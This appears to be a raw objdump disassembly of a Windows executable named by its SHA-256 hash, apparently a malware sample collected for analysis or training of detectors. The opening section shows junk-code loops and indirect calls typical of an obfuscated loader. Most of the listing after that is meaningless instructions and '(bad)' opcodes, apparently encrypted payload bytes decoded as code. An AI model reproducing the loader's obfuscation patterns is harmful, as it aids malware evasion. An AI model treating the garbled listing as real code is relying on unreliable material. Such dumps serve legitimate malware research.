
6209a3610eb6cce6d84b474d38f0ac96a3f65dfdea7ee645c69d427d676a22ef.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fe0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fe09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e21c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fdf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fdd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fdd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fdd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fdd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fdd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e627
  401090:	cmp    DWORD PTR ds:0x42fdd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fdd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fdd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e224,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e80b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e7fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e7fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e7fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e228
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e3cf
  401100:	cmp    DWORD PTR ds:0x42e7fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e7fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e7fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e7fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e7fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e21c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e21c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e21c,esi
  401145:	cmp    DWORD PTR ds:0x42e21c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e62b
  401160:	cmp    DWORD PTR ds:0x42e21c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e21c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e21c,esi
  40117c:	cmp    DWORD PTR ds:0x42e21c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e234,0x1a
  401193:	cmp    DWORD PTR ds:0x42e234,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e234,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fe7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e327
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e54b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e234
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e234,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e7fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fe05
  4011f8:	adc    esi,DWORD PTR ds:0x42fe09
  4011fe:	mov    DWORD PTR ds:0x42fe05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e803,0x17
  401216:	cmp    DWORD PTR ds:0x42e803,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e803,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e2c6
  401238:	push   0x42e27d
  40123d:	call   DWORD PTR ds:0x42e62f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e803
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e803,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fe7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fe7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fe7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e327
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e633
  4012a0:	mov    esi,DWORD PTR ds:0x42fe7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fe7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	(bad)  
  4012f4:	mov    dl,0xd2
  4012f6:	sbb    eax,0x70707070
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	xor    al,0x2
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	imul   esi,DWORD PTR [ebx+0xe],0xfffffff9
  4013ab:	jns    0x40138e
  4013ad:	jae    0x40142b
  4013af:	repz jb 0x401429
  4013b2:	cld    
  4013b3:	aam    0x6e
  4013b5:	cmc    
  4013b6:	xor    al,0x7f
  4013b8:	ds pop edx
  4013ba:	fimul  DWORD PTR [ebp+edi*4+0x1b5d6b9a]
  4013c1:	mov    ah,0x7c
  4013c3:	xchg   esi,eax
  4013c4:	jle    0x401351
  4013c6:	out    0xd9,eax
  4013c8:	arpl   WORD PTR [edi],ax
  4013ca:	pop    edi
  4013cb:	mov    ch,0xdd
  4013cd:	dec    esp
  4013ce:	stos   DWORD PTR es:[edi],eax
  4013cf:	add    eax,0x263fc58
  4013d4:	hlt    
  4013d5:	xchg   DWORD PTR [edx],edi
  4013d7:	xchg   esp,eax
  4013d8:	jge    0x4013f3
  4013da:	popa   
  4013db:	sub    al,0x50
  4013dd:	in     al,dx
  4013de:	cmp    BYTE PTR [edi-0x74],0xb1
  4013e2:	or     dl,BYTE PTR [esi+0x6c737bf5]
  4013e8:	iret   
  4013e9:	xor    cl,BYTE PTR [ebx+edi*2]
  4013ec:	mov    ecx,0x5974f0a5
  4013f1:	jno    0x401472
  4013f3:	mov    bl,0x6f
  4013f5:	mov    eax,ds:0x29022542
  4013fa:	sahf   
  4013fb:	lods   al,BYTE PTR ds:[esi]
  4013fc:	jae    0x4013d0
  4013fe:	sub    ebp,edi
  401400:	sub    al,0x7
  401402:	ror    DWORD PTR [ebp+0x74e5a001],0x63
  401409:	xchg   ebx,eax
  40140a:	mov    dl,0x3e
  40140c:	dec    esi
  40140d:	out    0x21,al
  40140f:	sbb    al,0x49
  401411:	leave  
  401412:	add    eax,0x743401a1
  401417:	mov    eax,0xebcdbfd5
  40141c:	(bad)  
  40141e:	xchg   ebp,eax
  40141f:	sti    
  401420:	add    DWORD PTR ds:0xe8535c87,edx
  401426:	out    0xa3,al
  401428:	mov    ds:0xba8adcf,eax
  40142d:	add    DWORD PTR [ebx-0x73],esp
  401430:	icebp  
  401431:	lea    edx,[eax]
  401433:	repnz mov WORD PTR [ebx-0x37],?
  401437:	sub    BYTE PTR [edi],dl
  401439:	jmp    0x2848f0d1
  40143e:	adc    DWORD PTR [ebx+0x46],ecx
  401441:	inc    ecx
  401442:	pop    es
  401443:	fbld   TBYTE PTR [edi+0x2e812c61]
  401449:	dec    ebx
  40144a:	cmp    ah,al
  40144c:	and    DWORD PTR [edx+0x7851811a],ecx
  401452:	out    0x15,al
  401454:	add    ecx,0xffffffdb
  401457:	daa    
  401458:	dec    ebx
  401459:	lock (bad) [esi]
  40145c:	mov    ch,0x2a
  40145e:	and    al,0xf1
  401460:	repnz in eax,dx
  401462:	dec    esi
  401463:	(bad)  
  401464:	mov    ?,WORD PTR [edi-0x2b5605c4]
  40146a:	and    edi,DWORD PTR [ebx-0x73]
  40146d:	pop    eax
  40146e:	push   esp
  40146f:	leave  
  401470:	push   0x3a
  401472:	and    eax,DWORD PTR [ebx+0x3e]
  401475:	pop    ss
  401476:	sub    eax,0x1777ce8b
  40147b:	jnp    0x4014d0
  40147d:	icebp  
  40147e:	jo     0x4014ad
  401480:	outs   dx,BYTE PTR ds:[esi]
  401481:	adc    ecx,DWORD PTR [ecx+ebp*8]
  401484:	(bad)  
  401485:	out    0x9c,eax
  401487:	test   eax,0x8b7bed4d
  40148c:	sbb    bl,ch
  40148e:	jae    0x401501
  401490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401491:	inc    esi
  401492:	jmp    0x442ad232
  401497:	repz xlat BYTE PTR ds:[ebx]
  40149a:	push   ecx
  40149b:	test   al,0x39
  40149d:	sub    BYTE PTR [ecx-0x36b3576d],bh
  4014a3:	ja     0x401495
  4014a5:	pop    ebx
  4014a6:	push   cs
  4014a7:	ror    DWORD PTR [ebp+0x4a],cl
  4014aa:	dec    ecx
  4014ab:	or     DWORD PTR [edi],ecx
  4014ad:	pop    ebp
  4014ae:	sbb    eax,DWORD PTR [edx+0x5c643823]
  4014b4:	call   0x463fd260
  4014b9:	aam    0x1c
  4014bb:	dec    ebx
  4014bc:	sbb    DWORD PTR [ebp+0x6d],edi
  4014bf:	jmp    0x363d:0x399a7e06
  4014c6:	add    ebp,eax
  4014c8:	jg     0x4014e8
  4014ca:	dec    ecx
  4014cb:	mov    edi,0xdcdef7ac
  4014d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014d1:	cmp    BYTE PTR [esi-0x281b94ee],cl
  4014d7:	arpl   dx,sp
  4014d9:	xchg   ebp,eax
  4014da:	in     al,dx
  4014db:	sti    
  4014dc:	repz dec edi
  4014de:	cmp    eax,0x34203022
  4014e3:	cwde   
  4014e4:	(bad)  
  4014e5:	or     eax,DWORD PTR [eax]
  4014e7:	(bad)
  4014eb:	push   es
  4014ec:	inc    ebp
  4014ed:	inc    ebx
  4014ee:	repz fisub DWORD PTR [eax+0x7fffa83b]
  4014f5:	inc    DWORD PTR [edx-0x3709f99d]
  4014fb:	and    eax,edi
  4014fd:	fwait
  4014fe:	shl    DWORD PTR [esi-0x77],0x45
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x4605e013]
  401516:	adc    BYTE PTR [edx+0x70],ch
  401519:	jle    0x40158b
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x401574
  401521:	popf   
  401522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401523:	stos   BYTE PTR es:[edi],al
  401524:	adc    al,0x5e
  401526:	es hlt 
  401528:	pop    esi
  401529:	outs   dx,DWORD PTR ds:[esi]
  40152a:	test   esi,eax
  40152c:	test   ah,cl
  40152e:	sbb    ebx,eax
  401530:	jecxz  0x401522
  401532:	or     esi,DWORD PTR [esi]
  401534:	ror    DWORD PTR [eax+0x21ff87b3],cl
  40153a:	push   ebp
  40153b:	out    dx,al
  40153c:	or     ecx,ecx
  40153e:	stos   BYTE PTR es:[edi],al
  40153f:	(bad)  
  401540:	js     0x401593
  401542:	cli    
  401543:	pop    ds
  401544:	ret    
  401545:	push   cs
  401546:	sahf   
  401547:	imul   eax,DWORD PTR [ebp+ebp*1+0x2d],0xffffffde
  40154c:	popa   
  40154d:	sahf   
  40154e:	and    dl,ah
  401550:	mov    esp,ebx
  401552:	add    DWORD PTR [ecx+0x5c2e9663],eax
  401558:	rol    DWORD PTR [ebx],cl
  40155a:	aam    0x9e
  40155c:	pop    ebx
  40155d:	in     al,dx
  40155e:	pop    eax
  40155f:	mov    eax,ds:0x935e19a2
  401564:	pushf  
  401565:	dec    esp
  401566:	jno    0x401525
  401568:	xor    DWORD PTR [ebx],0x344aceaa
  40156e:	pop    eax
  40156f:	les    esp,FWORD PTR [esi+0xb1d9d]
  401575:	mov    edi,DWORD PTR [ecx]
  401577:	scas   eax,DWORD PTR es:[edi]
  401578:	ret    0xe92
  40157b:	mov    dh,0x4d
  40157d:	and    BYTE PTR [edi],ch
  40157f:	mov    edi,0x74d33e0f
  401584:	mov    edi,0x92f20615
  401589:	outs   dx,BYTE PTR ds:[esi]
  40158a:	addr16 jne 0x4015a1
  40158d:	and    bh,BYTE PTR [edi]
  40158f:	mov    dh,0x79
  401591:	inc    edx
  401592:	pop    edx
  401593:	mov    dl,0x86
  401595:	stc    
  401596:	or     ebx,DWORD PTR [esi]
  401598:	int    0x9f
  40159a:	mov    esp,0x9f8934a3
  40159f:	mov    edx,0xfe876759
  4015a4:	inc    edx
  4015a5:	(bad)  ds:0x3e602a1a
  4015ab:	ja     0x4015f5
  4015ad:	ret    0xe9ec
  4015b0:	pop    edx
  4015b1:	pop    ss
  4015b2:	adc    cl,BYTE PTR [edx-0x52]
  4015b5:	mov    al,ds:0x996c3084
  4015ba:	test   al,0x1
  4015bc:	inc    ecx
  4015bd:	mov    edx,0xf1623222
  4015c2:	ret    0x2512
  4015c5:	lock clc 
  4015c7:	push   esp
  4015c8:	cmp    eax,0x53ceb933
  4015cd:	aad    0xfe
  4015cf:	pushf  
  4015d0:	jo     0x4015b2
  4015d2:	or     ecx,DWORD PTR [ebx]
  4015d4:	out    dx,eax
  4015d5:	fstp   DWORD PTR ds:0x892c4f53
  4015db:	inc    esp
  4015dc:	push   ss
  4015dd:	(bad)  
  4015df:	mov    esp,0x3b572d7d
  4015e4:	or     eax,0xdc7cd3db
  4015e9:	mov    ds:0x2562c1fd,eax
  4015ee:	add    al,0x42
  4015f0:	pop    ebx
  4015f1:	ins    BYTE PTR es:[edi],dx
  4015f2:	cmp    cl,dl
  4015f4:	add    edi,DWORD PTR [edi+0x17c69ff6]
  4015fa:	iret   
  4015fb:	push   0xac3ea066
  401600:	sub    ebp,DWORD PTR [esi-0x44c2883e]
  401606:	stos   BYTE PTR es:[edi],al
  401607:	fcomp  DWORD PTR [edx]
  401609:	adc    eax,0x1c93a4b
  40160e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40160f:	add    dh,BYTE PTR ss:[edi+0x25]
  401613:	xor    al,0xed
  401615:	sub    ch,al
  401617:	test   BYTE PTR [ecx],bh
  401619:	stos   DWORD PTR es:[edi],eax
  40161a:	es pop esi
  40161c:	retf   
  40161d:	or     eax,0xd4f1f081
  401622:	ds mov esi,0x15b066ae
  401628:	mov    BYTE PTR [esi],ch
  40162a:	lods   al,BYTE PTR ds:[esi]
  40162b:	add    BYTE PTR [eax+edi*2+0x65],dl
  40162f:	mov    ch,0xc0
  401631:	jmp    0x40168b
  401633:	repnz mov bh,BYTE PTR [ebx+0x1c8d551b]
  40163a:	(bad)  
  40163b:	fstp   DWORD PTR [edi+ebp*4]
  40163e:	adc    edx,DWORD PTR [ecx-0x35ffcff4]
  401644:	jp     0x40161a
  401646:	and    BYTE PTR [esi-0x21703014],0xb9
  40164d:	jb     0x401694
  40164f:	fidivr DWORD PTR [ebx]
  401651:	pop    edx
  401652:	inc    ecx
  401653:	lds    esi,FWORD PTR [ecx+0x4f9cecc2]
  401659:	xchg   edi,eax
  40165a:	sahf   
  40165b:	fucomip st,st(6)
  40165d:	(bad)  
  40165e:	sub    DWORD PTR [ebx+0x1aab21c2],esp
  401664:	sbb    esi,DWORD PTR [eax]
  401666:	pushf  
  401667:	test   eax,0x1eafdbf6
  40166c:	bound  ebx,QWORD PTR [eax+eax*1-0x52e396e1]
  401673:	or     al,0x62
  401675:	out    0xc4,al
  401677:	loop   0x4016bd
  401679:	xchg   DWORD PTR [esi-0x7b679b77],esp
  40167f:	sbb    DWORD PTR [eax],ebp
  401681:	mov    ds:0xb0f62848,eax
  401686:	ja     0x4016dd
  401688:	outs   dx,DWORD PTR ds:[esi]
  401689:	cmp    edi,DWORD PTR [edx-0x2fe14f66]
  40168f:	xor    eax,ecx
  401691:	mov    dl,0x5c
  401693:	shr    BYTE PTR [eax-0x520abed9],1
  401699:	inc    ecx
  40169a:	mov    esi,DWORD PTR [ebp+0x8baeac1]
  4016a0:	iret   
  4016a1:	pop    es
  4016a2:	cmp    al,0x61
  4016a4:	mov    ebp,ss
  4016a6:	in     al,0x73
  4016a8:	aam    0x30
  4016aa:	enter  0xe9d0,0x7e
  4016ae:	xchg   BYTE PTR [esi],bh
  4016b0:	cmp    dh,BYTE PTR ds:[esi]
  4016b3:	xor    BYTE PTR [edi],ah
  4016b5:	lods   eax,DWORD PTR ds:[esi]
  4016b6:	sub    BYTE PTR [esi],dl
  4016b8:	mov    ebx,0xb682519a
  4016bd:	pop    edx
  4016be:	and    bh,0x5f
  4016c1:	mov    edx,0xbca23449
  4016c6:	xor    BYTE PTR [esi+0x60536da4],ch
  4016cc:	pop    es
  4016cd:	pop    edx
  4016ce:	lods   al,BYTE PTR ds:[esi]
  4016cf:	dec    ecx
  4016d0:	ret    
  4016d1:	xor    edi,DWORD PTR [edx]
  4016d3:	mov    cs,WORD PTR [ecx-0x4c9f3704]
  4016d9:	mov    al,ds:0xbe715dc7
  4016de:	cmc    
  4016df:	add    eax,0x5774521
  4016e4:	cmc    
  4016e5:	mov    ch,0xc0
  4016e7:	push   0x4c
  4016e9:	sub    BYTE PTR [ebp-0x5d],dh
  4016ec:	jno    0x401692
  4016ee:	xor    BYTE PTR fs:[eax-0x65],0x40
  4016f3:	sbb    edi,DWORD PTR ds:0xe8db2e60
  4016f9:	push   ds
  4016fa:	test   BYTE PTR [ebp+0x6],bl
  4016fd:	es jb  0x4016c5
  401700:	xchg   ebx,eax
  401701:	sbb    BYTE PTR fs:[ebp-0x1cafe8d1],dh
  401708:	pop    eax
  401709:	ins    DWORD PTR es:[edi],dx
  40170a:	xlat   BYTE PTR ds:[ebx]
  40170b:	and    al,0x64
  40170d:	enter  0x155f,0x82
  401711:	ficomp WORD PTR [ecx-0x333de980]
  401717:	dec    eax
  401718:	add    BYTE PTR [esi],0x75
  40171b:	pop    ebx
  40171c:	mov    ebx,0x8daaff19
  401721:	inc    ebp
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	(bad)  
  401742:	and    eax,eax
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	push   edx
  40174d:	or     eax,0x9da2528f
  401752:	or     edi,edi
  401754:	ins    DWORD PTR es:[edi],dx
  401755:	or     al,0x30
  401757:	fist   DWORD PTR [eax+0x61]
  40175a:	mov    bh,0xb4
  40175c:	mov    ss,WORD PTR [eax-0x57]
  40175f:	fist   WORD PTR [edx+0xc55a0c7]
  401765:	inc    esp
  401766:	adc    edx,edi
  401768:	in     eax,0x59
  40176a:	mov    ecx,0x914dfb89
  40176f:	pop    ecx
  401770:	aad    0x7f
  401772:	dec    eax
  401773:	out    dx,al
  401774:	adc    al,0x20
  401776:	cld    
  401777:	in     eax,0xf4
  401779:	fisub  DWORD PTR [edi]
  40177b:	mov    dh,BYTE PTR [edi-0x2f8d9eef]
  401781:	push   esp
  401782:	fimul  WORD PTR [ebx-0x5c]
  401785:	repnz xchg edx,eax
  401787:	push   0xffffffd8
  401789:	add    ebx,edx
  40178b:	test   BYTE PTR [esp+ebx*2-0x24],dl
  40178f:	int3   
  401790:	mov    esi,0x653b327c
  401795:	fmul   QWORD PTR [esp+ebx*4-0x2b]
  401799:	stos   BYTE PTR es:[edi],al
  40179a:	sbb    dh,ah
  40179c:	popa   
  40179d:	add    dh,BYTE PTR [edi]
  40179f:	adc    DWORD PTR [edi],eax
  4017a1:	pop    eax
  4017a2:	dec    ecx
  4017a3:	out    dx,eax
  4017a4:	mov    edi,0x2c772f41
  4017a9:	out    dx,eax
  4017aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017ab:	out    0x57,al
  4017ad:	push   0x7126e627
  4017b2:	out    0x1a,eax
  4017b4:	adc    cl,0x7e
  4017b7:	data16 shr BYTE PTR [esi-0x37ab63ff],cl
  4017be:	repz fadd st,st(1)
  4017c1:	neg    DWORD PTR [ecx+ebx*1-0x54]
  4017c5:	pop    ecx
  4017c6:	and    eax,0xd2fea724
  4017cb:	sbb    bl,0xea
  4017ce:	outs   dx,DWORD PTR ds:[esi]
  4017cf:	into   
  4017d0:	sbb    eax,0xd1fa0814
  4017d5:	xor    al,BYTE PTR [ebp+0x26]
  4017d8:	stc    
  4017d9:	out    dx,al
  4017da:	test   al,0xac
  4017dc:	lods   eax,DWORD PTR ds:[esi]
  4017dd:	push   0x75
  4017df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017e0:	pop    edi
  4017e1:	or     bl,BYTE PTR [ebx]
  4017e3:	(bad)  
  4017e4:	sti    
  4017e5:	xchg   esi,eax
  4017e6:	js     0x4017f1
  4017e8:	test   eax,edx
  4017ea:	xor    ecx,ecx
  4017ec:	rol    DWORD PTR [eax+0x7f9dad0],0xf7
  4017f3:	ins    BYTE PTR es:[edi],dx
  4017f4:	mov    eax,ds:0xf57ad807
  4017f9:	mov    ds:0x8d8f4213,al
  4017fe:	sbb    cl,BYTE PTR [edi+0x74]
  401801:	or     bl,BYTE PTR [edi-0x46281ca1]
  401807:	push   edx
  401808:	mov    eax,ds:0x97c30de8
  40180d:	cmp    al,0x9e
  40180f:	pop    es
  401810:	adc    esi,edx
  401812:	gs dec edx
  401814:	lea    ebp,[ebx-0x69]
  401817:	sahf   
  401818:	in     al,0xc4
  40181a:	pusha  
  40181b:	dec    eax
  40181c:	xchg   esi,eax
  40181d:	aam    0xe0
  40181f:	push   ebp
  401820:	scas   eax,DWORD PTR es:[edi]
  401821:	sbb    eax,0x3f068eab
  401826:	enter  0x5adf,0x9
  40182a:	sbb    al,0x3a
  40182c:	sbb    esi,eax
  40182e:	xchg   esp,eax
  40182f:	sbb    DWORD PTR [eax],esp
  401831:	push   cs
  401832:	jne    0x401818
  401834:	call   0x729a:0x56b24d75
  40183b:	push   ebx
  40183c:	fs lock push esp
  40183f:	shl    BYTE PTR [eax-0x59a04f4e],0x59
  401846:	fstp   DWORD PTR [edi+0x1d]
  401849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40184a:	addr16 pop edi
  40184c:	test   eax,0x7644575e
  401851:	dec    edi
  401852:	push   ecx
  401853:	fwait
  401854:	test   al,0x4e
  401856:	or     dh,BYTE PTR ds:[edx+0x5c9604f]
  40185d:	ins    BYTE PTR es:[edi],dx
  40185e:	adc    cl,BYTE PTR [ebx+0x1e2aebe3]
  401864:	jg     0x401866
  401866:	adc    DWORD PTR [eax-0x1982c90a],ecx
  40186c:	(bad)  
  40186d:	pop    ss
  40186e:	fscale 
  401870:	sub    edx,DWORD PTR [ecx]
  401872:	sbb    DWORD PTR [ebp-0x49],esi
  401875:	leave  
  401876:	inc    ebx
  401877:	dec    esp
  401878:	adc    al,0xc8
  40187a:	dec    esi
  40187b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40187c:	jbe    0x4018dc
  40187e:	aam    0x41
  401880:	outs   dx,DWORD PTR ds:[esi]
  401881:	rcl    ch,cl
  401883:	(bad)  
  401884:	idiv   ah
  401886:	push   esp
  401887:	xlat   BYTE PTR ds:[ebx]
  401888:	push   ss
  401889:	gs dec edi
  40188b:	popa   
  40188c:	or     ch,BYTE PTR [esi+eax*1+0x39]
  401890:	repz pusha 
  401892:	lods   al,BYTE PTR ds:[esi]
  401893:	xchg   edx,ebp
  401895:	mov    ds:0xe7818a2b,eax
  40189a:	and    esi,DWORD PTR [esi]
  40189c:	xchg   DWORD PTR [eax],ecx
  40189e:	stos   DWORD PTR es:[edi],eax
  40189f:	imul   ecx,DWORD PTR [ecx+ecx*2-0x57],0xffffffb4
  4018a4:	jmp    0x5197ec3a
  4018a9:	lock xor al,0xac
  4018ac:	adc    esp,DWORD PTR [ecx-0x266b3bb9]
  4018b2:	sub    ebx,DWORD PTR [ecx+eiz*8]
  4018b5:	lods   eax,DWORD PTR ds:[esi]
  4018b6:	(bad)  
  4018b7:	sbb    eax,0xf7207723
  4018bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018bd:	jns    0x40192b
  4018bf:	scas   eax,DWORD PTR es:[edi]
  4018c0:	jmp    0x5e7b80d4
  4018c5:	add    DWORD PTR [ecx+edx*1],esp
  4018c8:	scas   eax,DWORD PTR es:[edi]
  4018c9:	(bad)  
  4018ca:	outs   dx,DWORD PTR ds:[esi]
  4018cb:	mov    edx,0xc0859701
  4018d0:	cmp    eax,0xf28f7572
  4018d5:	and    DWORD PTR [edx+0x5d343422],ebx
  4018db:	mov    BYTE PTR [eax+0x33],cl
  4018de:	jbe    0x40190e
  4018e0:	pop    ss
  4018e1:	imul   ah
  4018e3:	stc    
  4018e4:	cwde   
  4018e5:	imul   eax,DWORD PTR ss:[edi+0x2b0e90da],0xfffffff0
